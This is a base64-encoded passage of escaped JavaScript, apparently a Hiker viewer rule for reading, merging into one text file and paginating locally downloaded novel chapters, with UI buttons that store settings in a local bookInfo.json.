LSlXFxcXFxcXCI7XFxcXG4gICAgICAgIH1cXFxcbiAgICB9LCBwYXRoKSxcXFxcbiAgICBjb2xfdHlwZTogXFxcXFxcXCJ0ZXh0XzJcXFxcXFxcIlxcXFxufSk7XFxcXG5cXFxcbmxheW91dC5wdXNoKHtcXFxcbiAgICB0aXRsZTogW1xcXFxcXFwi55yL5bCP6K+0XFxcXFxcXCIsIFxcXFxcXFwi5Yig6Zmk56ug6IqCXFxcXFxcXCJdW21vZGVdLFxcXFxuICAgIHVybDogJChcXFxcXFxcIiNub0xvYWRpbmcjXFxcXFxcXCIpLmxhenlSdWxlKChtb2RlKSA9PiB7XFxcXG4gICAgICAgIHB1dE15VmFyKFxcXFxcXFwiLm1vZGVcXFxcXFxcIiwgbW9kZSA9PT0gXFxcXFxcXCIwXFxcXFxcXCIgPyBcXFxcXFxcIjFcXFxcXFxcIiA6IFxcXFxcXFwiMFxcXFxcXFwiKTtcXFxcbiAgICAgICAgcmVmcmVzaFBhZ2UodHJ1ZSk7XFxcXG4gICAgICAgIHJldHVybiBcXFxcXFxcImhpa2VyOi8vZW1wdHlcXFxcXFxcIlxcXFxuICAgIH0sIG1vZGUpLFxcXFxuICAgIGNvbF90eXBlOiBcXFxcXFxcInRleHRfMlxcXFxcXFwiXFxcXG59KTtcXFxcblxcXFxubGF5b3V0LnB1c2goe1xcXFxuICAgIHRpdGxlOiBcXFxcXFxcIuKAmOKAmOabtOWkmuWKn+iDvSA+4oCZ4oCZXFxcXFxcXCIsXFxcXG4gICAgdXJsOiBcXFxcXFxcImhpa2VyOi8vZW1wdHlcXFxcXFxcIixcXFxcbiAgICBjb2xfdHlwZTogXFxcXFxcXCJzY3JvbGxfYnV0dG9uXFxcXFxcXCJcXFxcbn0pO1xcXFxuXFxcXG5mdW5jdGlvbiB0eHQocGF0aHMpIHtcXFxcbiAgICBzaG93TG9hZGluZyhcXFxcXFxcIuato+WcqOWQiOW5ti4uLlxcXFxcXFwiKTtcXFxcbiAgICBjb25zdCBGaWxlID0gJC5yZXF1aXJlKFxcXFxcXFwiaGlrZXI6Ly9wYWdlL0ZpbGUuanNcXFxcXFxcIik7XFxcXG4gICAgY29uc3QgVG9vbCA9ICQucmVxdWlyZShcXFxcXFxcImhpa2VyOi8vcGFnZS9Ub29sLmpzXFxcXFxcXCIpO1xcXFxuICAgIGNvbnN0IENvbmZpZyA9ICQucmVxdWlyZShcXFxcXFxcImhpa2VyOi8vcGFnZS9Db25maWcuanNcXFxcXFxcIik7XFxcXG5cXFxcbiAgICBsZXQgZmlsZWxpc3QgPSBGaWxlLmdldEZpbGVQYXRoKHBhdGhzLnBhdGgsIFxcXFxcXFwiZmlsZVxcXFxcXFwiLCBcXFxcXFxcIi50eHRcXFxcXFxcIik7XFxcXG4gICAgbGV0IGxpc3RMZW5ndGggPSBmaWxlbGlzdC5sZW5ndGg7XFxcXG4gICAgaWYgKGxpc3RMZW5ndGggPT09IDApIHtcXFxcbiAgICAgICAgaGlkZUxvYWRpbmcoKTtcXFxcbiAgICAgICAgcmV0dXJuIFxcXFxcXFwidG9hc3Q6Ly/nqbrnmoTnq6DoioJcXFxcXFxcIjtcXFxcbiAgICB9XFxcXG4gICAgY29uc3QgYm9va0luZm8gPSBPYmplY3QuYXNzaWduKHtcXFxcbiAgICAgICAgc2VsZWN0ZWQ6IFtdLFxcXFxuICAgICAgICBpc1JlcGxhY2U6IHRydWVcXFxcbiAgICB9LCBKU09OLnBhcnNlKHJlcXVlc3QoXFxcXFxcXCJmaWxlOi8vXFxcXFxcXCIgKyBwYXRocy5wYXRoICsgXFxcXFxcXCIvYm9va0luZm8uanNvblxcXFxcXFwiKSB8fCBcXFxcXFxcInt9XFxcXFxcXCIpKTtcXFxcbiAgICBsZXQgYnVmaWxlbGlzdCA9IFtdO1xcXFxuICAgIGZvciAobGV0IGkgPSAwOyBpIDwgbGlzdExlbmd0aDsgaSsrKSB7XFxcXG4gICAgICAgIGxldCBmaWxlID0gZmlsZWxpc3RbaV07XFxcXG4gICAgICAgIGxldCBmaWxlSW5mbyA9IFRvb2wuc3BsaXQoZmlsZS5uYW1lLCBcXFxcXFxcIiRcXFxcXFxcIiwgMik7XFxcXG4gICAgICAgIGJ1ZmlsZWxpc3QucHVzaCh7XFxcXG4gICAgICAgICAgICBuYW1lOiBmaWxlSW5mb1syXS5zbGljZSgwLCBmaWxlSW5mb1syXS5sYXN0SW5kZXhPZihcXFxcXFxcIi5cXFxcXFxcIikpLFxcXFxuICAgICAgICAgICAgcGF0aDogXFxcXFxcXCJmaWxlOi8vXFxcXFxcXCIgKyBmaWxlLnBhdGgsXFxcXG4gICAgICAgICAgICBpZDogTnVtYmVyKGZpbGVJbmZvWzBdKSB8fCAwXFxcXG4gICAgICAgIH0pO1xcXFxuICAgIH1cXFxcbiAgICBidWZpbGVsaXN0LnNvcnQoKGEsIGIpID0+IGEuaWQgLSBiLmlkKTtcXFxcbiAgICBsZXQgZW50aXJlUGF0aCA9IHBhdGhzLnBhdGgucmVwbGFjZShDb25maWcubm92ZWxQYXRoLCBDb25maWcubm92ZWxGdWxsUGF0aCkgKyBcXFxcXFxcIi50eHRcXFxcXFxcIjtcXFxcbiAgICBsZXQgZW50aXJlUGF0aHRvID0gYm9va0luZm8uaXNSZXBsYWNlID8gZW50aXJlUGF0aCArIFxcXFxcXFwiLnRtcFxcXFxcXFwiIDogZW50aXJlUGF0aDtcXFxcblxcXFxuICAgIGlmIChmaWxlRXhpc3QoXFxcXFxcXCJmaWxlOi8vXFxcXFxcXCIgKyBlbnRpcmVQYXRoKSkge1xcXFxuICAgICAgICB0b2FzdChcXFxcXFxcIuWIneWni+WMluaWh+S7tlxcXFxcXFwiKTtcXFxcbiAgICAgICAgaWYgKCFGaWxlLmRlbGV0ZUZpbGVzKGVudGlyZVBhdGgpKSB7XFxcXG4gICAgICAgICAgICBoaWRlTG9hZGluZygpO1xcXFxuICAgICAgICAgICAgcmV0dXJuIFxcXFxcXFwidG9hc3Q6Ly/liJ3lp4vljJblpLHotKVcXFxcXFxcIjtcXFxcbiAgICAgICAgfSBlbHNlIHtcXFxcbiAgICAgICAgICAgIHRvYXN0KFxcXFxcXFwi5Yid5aeL5YyW5oiQ5YqfXFxcXFxcXCIpO1xcXFxuICAgICAgICB9XFxcXG4gICAgfVxcXFxuXFxcXG4gICAgZm9yIChsZXQgaSA9IDA7IGkgPCBsaXN0TGVuZ3RoOyBpKyspIHtcXFxcbiAgICAgICAgbGV0IGl0ZW0gPSBidWZpbGVsaXN0W2ldO1xcXFxuICAgICAgICBsZXQgY29udGVudCA9IHJlcXVlc3QoaXRlbS5wYXRoKTtcXFxcbiAgICAgICAgRmlsZS5maWxlV3JpdGVBcHBlbmQoZW50aXJlUGF0aHRvLCBpdGVtLm5hbWUgKyBcXFxcXFxcIlxcXFxcXFxcbuOAgOOAgFxcXFxcXFwiICsgY29udGVudC5yZXBsYWNlKC8mbmJzcDsvZyxcXFxcXFxcIlxcXFxcXFwiKS5zcGxpdCgvKFxcXFxcXFxcbnxcXFxcXFxcXHIpKy8pLmZpbHRlcihpdCA9PiBpdC50cmltKCkubGVuZ3RoID4gMSkubWFwKGl0PT5pdC50cmltKCkpLmpvaW4oXFxcXFxcXCJcXFxcXFxcXHLjgIDjgIBcXFxcXFxcIikgKyBcXFxcXFxcIlxcXFxcXFxcblxcXFxcXFxcblxcXFxcXFwiKTtcXFxcbiAgICB9XFxcXG4gICAgaWYgKGJvb2tJbmZvLmlzUmVwbGFjZSkge1xcXFxuICAgICAgICBsZXQgcnVsZUxpc3QgPSBKU09OLnBhcnNlKHJlYWRGaWxlKFxcXFxcXFwicmVwbGFjZVJ1bGUuanNvblxcXFxcXFwiKSB8fCBcXFxcXFxcIltdXFxcXFxcXCIpO1xcXFxuICAgICAgICBsZXQgbGVuID0gcnVsZUxpc3QubGVuZ3RoO1xcXFxuICAgICAgICBsZXQgcmVwbGFjZVBhdHRlcm4gPSBbXFxcXFxcXCJyZXBsYWNlXFxcXFxcXCIsIFxcXFxcXFwicmVwbGFjZUFsbFxcXFxcXFwiXTtcXFxcbiAgICAgICAgbGV0IGZsYWcgPSBGaWxlLmZpbGVSdWxlKGVudGlyZVBhdGh0bywgZW50aXJlUGF0aCwgKGphdmFTdHJpbmcpID0+IHtcXFxcbiAgICAgICAgICAgIGZvciAobGV0IGkgPSAwOyBpIDwgbGVuOyBpKyspIHtcXFxcbiAgICAgICAgICAgICAgICBsZXQgcmVwbGFjZVJ1bGUgPSBydWxlTGlzdFtpXTtcXFxcbiAgICAgICAgICAgICAgICBpZiAoIWJvb2tJbmZvLnNlbGVjdGVkLmluY2x1ZGVzKHJlcGxhY2VSdWxlLmlkKSkge1xcXFxuICAgICAgICAgICAgICAgICAgICBjb250aW51ZTtcXFxcbiAgICAgICAgICAgICAgICB9XFxcXG4gICAgICAgICAgICAgICAgbGV0IHJlcGxhY2UgPSByZXBsYWNlUGF0dGVyblswICsgcmVwbGFjZVJ1bGUuaXNSZWdleF07XFxcXG4gICAgICAgICAgICAgICAgamF2YVN0cmluZyA9IGphdmFTdHJpbmdbcmVwbGFjZV0ocmVwbGFjZVJ1bGUucGF0dGVybiwgcmVwbGFjZVJ1bGUucmVwbGFjZW1lbnQpO1xcXFxuICAgICAgICAgICAgfVxcXFxuICAgICAgICAgICAgcmV0dXJuIGphdmFTdHJpbmcuZ2V0Qnl0ZXMoKTtcXFxcbiAgICAgICAgfSk7XFxcXG4gICAgICAgIGlmICghZmxhZykge1xcXFxuICAgICAgICAgICAgaGlkZUxvYWRpbmcoKTtcXFxcbiAgICAgICAgICAgIHJldHVybiBcXFxcXFxcInRvYXN0Oi8v5ZCI5bm25aSx6LSlXFxcXFxcXCI7XFxcXG4gICAgICAgIH1cXFxcblxcXFxuICAgIH1cXFxcbiAgICBoaWRlTG9hZGluZygpO1xcXFxuICAgIHJldHVybiBcXFxcXFxcInRvYXN0Oi8v5ZCI5bm25a6M5oiQXFxcXFxcXCI7XFxcXG59XFxcXG5sYXlvdXQucHVzaCh7XFxcXG4gICAgdGl0bGU6IFxcXFxcXFwi5ZCI5bm25bCP6K+0XFxcXFxcXCIsXFxcXG4gICAgdXJsOiAkKFxcXFxcXFwi56Gu5a6a5ZCI5bm2P1xcXFxcXFxcbuS8muimhuebluW3suaciVRYVFxcXFxcXFwiKS5jb25maXJtKHR4dCwgTVlfUEFSQU1TKSxcXFxcbiAgICBjb2xfdHlwZTogXFxcXFxcXCJzY3JvbGxfYnV0dG9uXFxcXFxcXCJcXFxcbn0pO1xcXFxubGF5b3V0LnB1c2goe1xcXFxuICAgIHRpdGxlOiBbXFxcXFxcXCLimJDliIbpobVcXFxcXFxcIiwgXFxcXFxcXCLimJHliIbpobVcXFxcXFxcIl1bbW9kZTJdLFxcXFxuICAgIHVybDogJChcXFxcXFxcIiNub0xvYWRpbmcjXFxcXFxcXCIpLmxhenlSdWxlKChtb2RlMikgPT4ge1xcXFxuICAgICAgICBwdXRNeVZhcihcXFxcXFxcIi5tb2RlMlxcXFxcXFwiLCBtb2RlMiA9PT0gXFxcXFxcXCIwXFxcXFxcXCIgPyBcXFxcXFxcIjFcXFxcXFxcIiA6IFxcXFxcXFwiMFxcXFxcXFwiKTtcXFxcbiAgICAgICAgcmVmcmVzaFBhZ2UodHJ1ZSk7XFxcXG4gICAgICAgIHJldHVybiBcXFxcXFxcImhpa2VyOi8vZW1wdHlcXFxcXFxcIjtcXFxcbiAgICB9LCBtb2RlMiksXFxcXG4gICAgY29sX3R5cGU6IFxcXFxcXFwic2Nyb2xsX2J1dHRvblxcXFxcXFwiXFxcXG59KTtcXFxcbmxheW91dC5wdXNoKHtcXFxcbiAgICB0aXRsZTogW1xcXFxcXFwi4piQ5YiG5q61XFxcXFxcXCIsIFxcXFxcXFwi4piR5YiG5q61XFxcXFxcXCJdW051bWJlcihib29rSW5mby5pc1NlZ21lbnQpXSxcXFxcbiAgICB1cmw6ICQoXFxcXFxcXCIjbm9Mb2FkaW5nI1xcXFxcXFwiKS5sYXp5UnVsZSgoaXNTZWdtZW50LCBwYXRoKSA9PiB7XFxcXG4gICAgICAgIGNvbnN0IGJvb2tJbmZvID0gSlNPTi5wYXJzZShyZXF1ZXN0KFxcXFxcXFwiZmlsZTovL1xcXFxcXFwiICsgcGF0aCArIFxcXFxcXFwiL2Jvb2tJbmZvLmpzb25cXFxcXFxcIikgfHwgXFxcXFxcXCJ7fVxcXFxcXFwiKTtcXFxcbiAgICAgICAgYm9va0luZm8uaXNTZWdtZW50ID0gIWlzU2VnbWVudDtcXFxcbiAgICAgICAgd3JpdGVGaWxlKFxcXFxcXFwiZmlsZTovL1xcXFxcXFwiICsgcGF0aCtcXFxcXFxcIi9ib29rSW5mby5qc29uXFxcXFxcXCIsIEpTT04uc3RyaW5naWZ5KGJvb2tJbmZvKSk7XFxcXG4gICAgICAgIHJlZnJlc2hQYWdlKGZhbHNlKTtcXFxcbiAgICAgICAgcmV0dXJuIFxcXFxcXFwiaGlrZXI6Ly9lbXB0eVxcXFxcXFwiO1xcXFxuICAgIH0sIGJvb2tJbmZvLmlzU2VnbWVudCwgcGF0aCksXFxcXG4gICAgY29sX3R5cGU6IFxcXFxcXFwic2Nyb2xsX2J1dHRvblxcXFxcXFwiXFxcXG59KTtcXFxcbmxheW91dC5wdXNoKHtcXFxcbiAgICB0aXRsZTogXFxcXFxcXCLlh4DljJZcXFxcXFxcIixcXFxcbiAgICB1cmw6IFxcXFxcXFwiaGlrZXI6Ly9wYWdlL05vdmVsQ3VzdG9tLnZpZXcjbm9SZWNvcmRIaXN0b3J5IyNub0hpc3RvcnkjI25vUmVmcmVzaCNcXFxcXFxcIixcXFxcbiAgICBleHRyYTogTVlfUEFSQU1TLFxcXFxuICAgIGNvbF90eXBlOiBcXFxcXFxcInNjcm9sbF9idXR0b25cXFxcXFxcIlxcXFxufSk7XFxcXG5sYXlvdXQucHVzaCh7XFxcXG4gICAgdGl0bGU6IFxcXFxcXFwi5aSW6YOo5p+l55yLXFxcXFxcXCIsXFxcXG4gICAgdXJsOiAkKFxcXFxcXFwiI25vTG9hZGluZyNcXFxcXFxcIikubGF6eVJ1bGUoKHBhdGgpID0+IHtcXFxcbiAgICAgICAgY29uc3QgQ29uZmlnID0gJC5yZXF1aXJlKFxcXFxcXFwiaGlrZXI6Ly9wYWdlL0NvbmZpZy5qc1xcXFxcXFwiKTtcXFxcbiAgICAgICAgbGV0IGVudGlyZVBhdGggPSBwYXRoLnJlcGxhY2UoQ29uZmlnLm5vdmVsUGF0aCwgQ29uZmlnLm5vdmVsRnVsbFBhdGgpICsgXFxcXFxcXCIudHh0XFxcXFxcXCI7XFxcXG4gICAgICAgIGlmIChmaWxlRXhpc3QoXFxcXFxcXCJmaWxlOi8vXFxcXFxcXCIgKyBlbnRpcmVQYXRoKSkge1xcXFxuICAgICAgICAgICAgdG9hc3QoXFxcXFxcXCLosIPnlKjnrKzkuInmlrnlupTnlKjmiZPlvIDmlofku7ZcXFxcXFxcIik7XFxcXG4gICAgICAgICAgICByZXR1cm4gXFxcXFxcXCJvcGVuRmlsZTovL2ZpbGU6Ly9cXFxcXFxcIiArIGVudGlyZVBhdGhcXFxcbiAgICAgICAgfSBlbHNlIHtcXFxcbiAgICAgICAgICAgIHJldHVybiBcXFxcXFxcInRvYXN0Oi8v5pys5Zyw5pqC5peg5Y+v5L6b5aSW6YOo5omT5byA55qEdHh05paH5Lu277yM6K+35YWI5ZCI5bm25bCP6K+077yBXFxcXFxcXCJcXFxcbiAgICAgICAgfVxcXFxuICAgIH0sIHBhdGgpLFxcXFxuICAgIGNvbF90eXBlOiBcXFxcXFxcInNjcm9sbF9idXR0b25cXFxcXFxcIlxcXFxufSk7XFxcXG5sYXlvdXQucHVzaCh7XFxcXG4gICAgY29sX3R5cGU6IFxcXFxcXFwibGluZV9ibGFua1xcXFxcXFwiXFxcXG59KTtcXFxcblxcXFxubGV0IG1obGlzdCA9IEZpbGUuZ2V0RmlsZVBhdGgocGF0aCwgXFxcXFxcXCJmaWxlXFxcXFxcXCIsIFxcXFxcXFwiLnR4dFxcXFxcXFwiKTtcXFxcbm1obGlzdC5zb3J0KChhLCBiKSA9PiB7XFxcXG4gICAgYSA9IChhLm5hbWUubWF0Y2goL1xcXFxcXFxcZCsvKSB8fCBbXSlbMF0gfHwgMDtcXFxcbiAgICBiID0gKGIubmFtZS5tYXRjaCgvXFxcXFxcXFxkKy8pIHx8IFtdKVswXSB8fCAwO1xcXFxuICAgIHJldHVybiBhIC0gYjtcXFxcbn0pO1xcXFxubGV0IGNoYXB0ZXJMaXN0ID0gW107XFxcXG5sZXQgY2hhcHRlckNvdW50ID0gbWhsaXN0Lmxlbmd0aDtcXFxcblxcXFxuaWYgKG1vZGUyID09PSBcXFxcXFxcIjFcXFxcXFxcIikge1xcXFxuICAgIGxldCBtaGxpc3RDaHVuayA9IFRvb2wuY2h1bmsobWhsaXN0LCBDb25maWcudmlld1BhZ2VTaXplKTtcXFxcbiAgICBsZXQgdmlld1BhZ2VDb3VudCA9IG1obGlzdENodW5rLmxlbmd0aDtcXFxcbiAgICBsZXQgZGVmUGFnZSA9ICh2aWV3UGFnZUNvdW50IC0gMSA8IGJvb2tJbmZvLmZvb3QgPyAwIDogYm9va0luZm8uZm9vdCkgfHwgMDtcXFxcbiAgICBsZXQgcGFnZU51bSA9IE51bWJlcihnZXRNeVZhcihcXFxcXFxcIi5wYWdlTnVtXFxcXFxcXCIsIFxcXFxcXFwiXFxcXFxcXCIgKyBkZWZQYWdlKSk7XFxcXG4gICAgY2hhcHRlckxpc3QgPSBtaGxpc3RDaHVua1twYWdlTnVtXSB8fCBbXTtcXFxcbiAgICBsYXlvdXQucHVzaCh7XFxcXG4gICAgICAgIHRpdGxlOiBcXFxcXFxcIuKAnOKAnOKAneKAnVxcXFxcXFwiICsgXFxcXFxcXCLnq6DoioIgXFxcXFxcXCIuYmlnKCkgKyAoXFxcXFxcXCLmnKzpobU6XFxcXFxcXCIgKyBjaGFwdGVyTGlzdC5sZW5ndGggKyBcXFxcXFxcIiDlhbHmnIk6XFxcXFxcXCIgKyBjaGFwdGVyQ291bnQgKyBcXFxcXFxcIueroCDlvZPliY06XFxcXFxcXCIgKyAocGFnZU51bSArIDEpICsgXFxcXFxcXCIvXFxcXFxcXCIgKyB2aWV3UGFnZUNvdW50KS5zbWFsbCgpLFxcXFxuICAgICAgICB1cmw6ICQoXFxcXFxcXCIjbm9Mb2FkaW5nI1xcXFxcXFwiKS5sYXp5UnVsZSgoaXNSZXZlcnNlKSA9PiB7XFxcXG4gICAgICAgICAgICBwdXRNeVZhcihcXFxcXFxcIi5pc1JldmVyc2VcXFxcXFxcIiwgaXNSZXZlcnNlID09PSBcXFxcXFxcIjBcXFxcXFxcIiA/IFxcXFxcXFwiMVxcXFxcXFwiIDogXFxcXFxcXCIwXFxcXFxcXCIpO1xcXFxuICAgICAgICAgICAgcmVmcmVzaFBhZ2UodHJ1ZSk7XFxcXG4gICAgICAgICAgICByZXR1cm4gXFxcXFxcXCJoaWtlcjovL2VtcHR5XFxcXFxcXCJcXFxcbiAgICAgICAgfSwgaXNSZXZlcnNlKSxcXFxcbiAgICAgICAgY29sX3R5cGU6IFxcXFxcXFwidGV4dF8xXFxcXFxcXCJcXFxcbiAgICB9KTtcXFxcbiAgICBsYXlvdXQucHVzaCh7XFxcXG4gICAgICAgIHRpdGxlOiBcXFxcXFxcIui3s+mbhlxcXFxcXFwiLFxcXFxuICAgICAgICB1cmw6ICQoY2hhcHRlckNvdW50LCBcXFxcXFxcIui+k+WFpei3s+i9rOeroOiKgiAxLVxcXFxcXFwiICsgY2hhcHRlckNvdW50KS5pbnB1dCgoY2hhcHRlckNvdW50LCBwYWdlTnVtLCB2aWV3UGFnZVNpemUsIHBhdGgpID0+IHtcXFxcbiAgICAgICAgICAgIGxldCBpbnB1dE51bSA9IE51bWJlcihpbnB1dCk7XFxcXG4gICAgICAgICAgICBpZiAoTnVtYmVyLmlzTmFOKGlucHV0TnVtKSB8fCBpbnB1dE51bSA8IDAgfHwgaW5wdXROdW0gPiBjaGFwdGVyQ291bnQpIHtcXFxcbiAgICAgICAgICAgICAgICByZXR1cm4gXFxcXFxcXCJ0b2FzdDovL+ivt+i+k+WFpeato+ehruiMg+WbtOWGheeahOaVsOWtl1xcXFxcXFwiO1xcXFxuICAgICAgICAgICAgfVxcXFxuICAgICAgICAgICAgaW5wdXROdW0gPSBNYXRoLmZsb29yKChpbnB1dE51bSArIHZpZXdQYWdlU2l6ZSkgLyB2aWV3UGFnZVNpemUpIC0gMTtcXFxcbiAgICAgICAgICAgIGlmIChwYWdlTnVtID09PSBpbnB1dE51bSkgcmV0dXJuIFxcXFxcXFwidG9hc3Q6Ly/mraPlnKjlvZPliY3pobXpnaJcXFxcXFxcIjtcXFxcbiAgICAgICAgICAgIHB1dE15VmFyKFxcXFxcXFwiLnBhZ2VOdW1cXFxcXFxcIiwgXFxcXFxcXCJcXFxcXFxcIiArIGlucHV0TnVtKTtcXFxcbiAgICAgICAgICAgIGNvbnN0IGJvb2tJbmZvID0gSlNPTi5wYXJzZShyZXF1ZXN0KFxcXFxcXFwiZmlsZTovL1xcXFxcXFwiICsgcGF0aCArIFxcXFxcXFwiL2Jvb2tJbmZvLmpzb25cXFxcXFxcIikgfHwgXFxcXFxcXCJ7fVxcXFxcXFwiKTtcXFxcbiAgICAgICAgICAgIGJvb2tJbmZvLmZvb3QgPSBpbnB1dE51bTtcXFxcbiAgICAgICAgICAgIHdyaXRlRmlsZShcXFxcXFxcImZpbGU6Ly9cXFxcXFxcIiArIHBhdGgsIEpTT04uc3RyaW5naWZ5KGJvb2tJbmZvKSk7XFxcXG4gICAgICAgICAgICByZWZyZXNoUGFnZShmYWxzZSk7XFxcXG4gICAgICAgIH0sIGNoYXB0ZXJDb3VudCwgcGFnZU51bSwgQ29uZmlnLnZpZXdQYWdlU2l6ZSwgcGF0aCksXFxcXG4gICAgICAgIGNvbF90eXBlOiBcXFxcXFxcInRleHRfNVxcXFxcXFwiXFxcXG4gICAgfSk7XFxcXG4gICAgbGF5b3V0LnB1c2goe1xcXFxuICAgICAgICB0aXRsZTogXFxcXFxcXCLot7PpobVcXFxcXFxcIixcXFxcbiAgICAgICAgdXJsOiAkKHBhZ2VOdW0gKyAxLCBcXFxcXFxcIui3s+i9rOmhteaVsCAxLVxcXFxcXFwiICsgdmlld1BhZ2VDb3VudCkuaW5wdXQoKHZpZXdQYWdlQ291bnQsIHBhZ2VOdW0sIHBhdGgpID0+IHtcXFxcbiAgICAgICAgICAgIGxldCBpbnB1dE51bSA9IE51bWJlcihpbnB1dCkgLSAxO1xcXFxuICAgICAgICAgICAgaWYgKE51bWJlci5pc05hTihpbnB1dE51bSkgfHwgaW5wdXROdW0gPCAwIHx8IGlucHV0TnVtID4gdmlld1BhZ2VDb3VudCAtIDEpIHtcXFxcbiAgICAgICAgICAgICAgICByZXR1cm4gXFxcXFxcXCJ0b2FzdDovL+ivt+i+k+WFpeato+ehruiMg+WbtOWGheeahOaVsOWtl1xcXFxcXFwiO1xcXFxuICAgICAgICAgICAgfVxcXFxuICAgICAgICAgICAgaWYgKHBhZ2VOdW0gPT09IGlucHV0TnVtKSByZXR1cm4gXFxcXFxcXCJ0b2FzdDovL+ato+WcqOW9k+WJjemhtemdolxcXFxcXFwiO1xcXFxuICAgICAgICAgICAgcHV0TXlWYXIoXFxcXFxcXCIucGFnZU51bVxcXFxcXFwiLCBcXFxcXFxcIlxcXFxcXFwiICsgaW5wdXROdW0pO1xcXFxuICAgICAgICAgICAgY29uc3QgYm9va0luZm8gPSBKU09OLnBhcnNlKHJlcXVlc3QoXFxcXFxcXCJmaWxlOi8vXFxcXFxcXCIgKyBwYXRoICsgXFxcXFxcXCIvYm9va0luZm8uanNvblxcXFxcXFwiKSB8fCBcXFxcXFxcInt9XFxcXFxcXCIpO1xcXFxuICAgICAgICAgICAgYm9va0luZm8uZm9vdCA9IGlucHV0TnVtO1xcXFxuICAgICAgICAgICAgd3JpdGVGaWxlKFxcXFxcXFwiZmlsZTovL1xcXFxcXFwiICsgcGF0aCArIFxcXFxcXFwiL2Jvb2tJbmZvLmpzb25cXFxcXFxcIiwgSlNPTi5zdHJpbmdpZnkoYm9va0luZm8pKTtcXFxcbiAgICAgICAgICAgIHJlZnJlc2hQYWdlKGZhbHNlKTtcXFxcbiAgICAgICAgfSwgdmlld1BhZ2VDb3VudCwgcGFnZU51bSwgcGF0aCksXFxcXG4gICAgICAgIGNvbF90eXBlOiBcXFxcXFxcInRleHRfNVxcXFxcXFwiXFxcXG4gICAgfSk7XFxcXG4gICAgbGF5b3V0LnB1c2goe1xcXFxuICAgICAgICB0aXRsZTogXFxcXFxcXCLkuIrkuIDpobVcXFxcXFxcIixcXFxcbiAgICAgICAgdXJsOiAkKFxcXFxcXFwiI25vTG9hZGluZyNcXFxcXFxcIikubGF6eVJ1bGUoKHBhZ2VOdW0sIHBhdGgpID0+IHtcXFxcbiAgICAgICAgICAgIGxldCBpbnB1dE51bSA9IHBhZ2VOdW0gLSAxO1xcXFxuICAgICAgICAgICAgaWYgKGlucHV0TnVtIDwgMCkge1xcXFxuICAgICAgICAgICAgICAgIHJldHVybiBcXFxcXFxcInRvYXN0Oi8v5bey57uP5piv56ys5LiA6aG15LqGXFxcXFxcXCI7XFxcXG4gICAgICAgICAgICB9XFxcXG4gICAgICAgICAgICBwdXRNeVZhcihcXFxcXFxcIi5wYWdlTnVtXFxcXFxcXCIsIFxcXFxcXFwiXFxcXFxcXCIgKyBpbnB1dE51bSk7XFxcXG4gICAgICAgICAgICBjb25zdCBib29rSW5mbyA9IEpTT04ucGFyc2UocmVxdWVzdChcXFxcXFxcImZpbGU6Ly9cXFxcXFxcIiArIHBhdGggKyBcXFxcXFxcIi9ib29rSW5mby5qc29uXFxcXFxcXCIpIHx8IFxcXFxcXFwie31cXFxcXFxcIik7XFxcXG4gICAgICAgICAgICBib29rSW5mby5mb290ID0gaW5wdXROdW07XFxcXG4gICAgICAgICAgICB3cml0ZUZpbGUoXFxcXFxcXCJmaWxlOi8vXFxcXFxcXCIgKyBwYXRoICsgXFxcXFxcXCIvYm9va0luZm8uanNvblxcXFxcXFwiLCBKU09OLnN0cmluZ2lmeShib29rSW5mbykpO1xcXFxuICAgICAgICAgICAgcmVmcmVzaFBhZ2UoZmFsc2UpO1xcXFxuICAgICAgICAgICAgcmV0dXJuIFxcXFxcXFwiaGlrZXI6Ly9lbXB0eVxcXFxcXFwiO1xcXFxuICAgICAgICB9LCBwYWdlTnVtLCBwYXRoKSxcXFxcbiAgICAgICAgY29sX3R5cGU6IFxcXFxcXFwidGV4dF81XFxcXFxcXCJcXFxcbiAgICB9KTtcXFxcbiAgICBsYXlvdXQucHVzaCh7XFxcXG4gICAgICAgIHRpdGxlOiBcXFxcXFxcIuS4i+S4gOmhtVxcXFxcXFwiLFxcXFxuICAgICAgICB1cmw6ICQoXFxcXFxcXCIjbm9Mb2FkaW5nI1xcXFxcXFwiKS5sYXp5UnVsZSgodmlld1BhZ2VDb3VudCwgcGFnZU51bSwgcGF0aCkgPT4ge1xcXFxuICAgICAgICAgICAgbGV0IGlucHV0TnVtID0gcGFnZU51bSArIDE7XFxcXG4gICAgICAgICAgICBpZiAoaW5wdXROdW0gPiB2aWV3UGFnZUNvdW50IC0gMSkge1xcXFxuICAgICAgICAgICAgICAgIHJldHVybiBcXFxcXFxcInRvYXN0Oi8v5bey57uP5piv5pyA5ZCO5LiA6aG15LqGXFxcXFxcXCI7XFxcXG4gICAgICAgICAgICB9XFxcXG4gICAgICAgICAgICBwdXRNeVZhcihcXFxcXFxcIi5wYWdlTnVtXFxcXFxcXCIsIFxcXFxcXFwiXFxcXFxcXCIgKyBpbnB1dE51bSk7XFxcXG4gICAgICAgICAgICBjb25zdCBib29rSW5mbyA9IEpTT04ucGFyc2UocmVxdWVzdChcXFxcXFxcImZpbGU6Ly9cXFxcXFxcIiArIHBhdGggKyBcXFxcXFxcIi9ib29rSW5mby5qc29uXFxcXFxcXCIpIHx8IFxcXFxcXFwie31cXFxcXFxcIik7XFxcXG4gICAgICAgICAgICBib29rSW5mby5mb290ID0gaW5wdXROdW07XFxcXG4gICAgICAgICAgICB3cml0ZUZpbGUoXFxcXFxcXCJmaWxlOi8vXFxcXFxcXCIgKyBwYXRoICsgXFxcXFxcXCIvYm9va0luZm8uanNvblxcXFxcXFwiLCBKU09OLnN0cmluZ2lmeShib29rSW5mbykpO1xcXFxuICAgICAgICAgICAgcmVmcmVzaFBhZ2UoZmFsc2UpO1xcXFxuICAgICAgICAgICAgcmV0dXJuIFxcXFxcXFwiaGlrZXI6Ly9lbXB0eVxcXFxcXFwiO1xcXFxuICAgICAgICB9LCB2aWV3UGFnZUNvdW50LCBwYWdlTnVtLCBwYXRoKSxcXFxcbiAgICAgICAgY29sX3R5cGU6IFxcXFxcXFwidGV4dF81XFxcXFxcXCJcXFxcbiAgICB9KTtcXFxcbiAgICBsYXlvdXQucHVzaCh7XFxcXG4gICAgICAgIHRpdGxlOiBcXFxcXFxcIuacq+mhtVxcXFxcXFwiLFxcXFxuICAgICAgICB1cmw6ICQoXFxcXFxcXCIjbm9Mb2FkaW5nI1xcXFxcXFwiKS5sYXp5UnVsZSgodmlld1BhZ2VDb3VudCwgcGFnZU51bSwgcGF0aCkgPT4ge1xcXFxuICAgICAgICAgICAgbGV0IGlucHV0TnVtID0gdmlld1BhZ2VDb3VudCAtIDE7XFxcXG4gICAgICAgICAgICBpZiAocGFnZU51bSA9PT0gaW5wdXROdW0gfHwgaW5wdXROdW0gPT09IC0